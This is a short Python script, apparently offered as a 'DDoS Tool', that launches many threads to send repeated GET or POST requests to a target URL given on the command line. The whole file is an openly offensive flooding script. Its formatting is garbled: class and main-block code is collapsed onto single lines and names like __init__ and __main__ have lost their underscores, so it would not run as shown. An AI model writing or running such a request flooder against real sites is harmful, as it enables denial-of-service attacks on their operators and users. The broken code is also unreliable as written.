import requests
import threading
import time 
import argparse

class DDoSTool: def init(self, target, threads, requests, method): self.target = target self.threads = threads self.requests = requests self.method = method.upper()

def attack(self):
    for _ in range(self.requests):
        try:
            if self.method == "GET":
                response = requests.get(self.target)
            elif self.method == "POST":
                response = requests.post(self.target, data={"data": "test"})
            print(f"[+] Request sent to {self.target} - Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Request failed: {e}")

def run(self):
    threads = []
    for _ in range(self.threads):
        thread = threading.Thread(target=self.attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if name == "main": parser = argparse.ArgumentParser(description="Python DDoS Tool") parser.add_argument("-t", "--target", required=True, help="Target URL") parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads") parser.add_argument("-r", "--requests", type=int, default=100, help="Number of requests per thread") parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP method") args = parser.parse_args()

ddos = DDoSTool(args.target, args.threads, args.requests, args.method)
print(f"Starting attack on {args.target} with {args.threads} threads and {args.requests} requests per thread using {args.method} method.")
ddos.run()

